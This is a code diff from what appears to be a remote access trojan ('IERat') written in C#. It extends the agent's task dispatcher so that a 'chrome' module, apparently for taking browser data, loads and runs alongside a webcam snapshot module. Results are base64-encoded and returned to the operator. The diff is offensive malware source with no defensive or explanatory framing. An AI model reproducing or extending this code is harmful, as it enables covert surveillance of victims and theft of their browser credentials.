@@ -161,21 +161,29 @@ namespace IERat.lib
                             try
                             {
                                 NewAgentTask.Status = "Completed";
-                                if (CmdType == "camsnapshot") // add other modules to the if that do not run as threads
+                                if ((CmdType == "camsnapshot") || (CmdType == "chrome"))  // add other modules to the if that do not run as threads
                                 {
                                     MethodInfo StartMethod = null;
-                                    if (this.agent.LoadedModules.ContainsKey("camsnapshot"))
+                                    if (this.agent.LoadedModules.ContainsKey(CmdType))
                                     {
-                                        StartMethod = (MethodInfo)this.agent.LoadedModules["camsnapshot"];
+                                        StartMethod = (MethodInfo)this.agent.LoadedModules[CmdType];
                                     }
                                     else
                                     {
-                                        StartMethod = (MethodInfo)Modules.LoadModule(NewAgentTask.args);
+                                        StartMethod = (MethodInfo)Modules.LoadModule(NewAgentTask.args, CmdType);
                                         NewAgentTask.args = "";
-                                        this.agent.LoadedModules.Add("camsnapshot", StartMethod);
+                                        this.agent.LoadedModules.Add(CmdType, StartMethod);
                                     }
-                                    byte[] result = (byte[])StartMethod.Invoke(null, null);
-                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(result));
+
+                                    if (CmdType == "camsnapshot")
+                                    {
+                                        byte[] result = (byte[])StartMethod.Invoke(null, null);
+                                        NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(result));
+                                    }
+                                    else
+                                    {
+                                        NewAgentTask.Result = (string)StartMethod.Invoke(null, null);
+                                    }
                                 }
                                 else if (CmdType == "execute")
                                 {
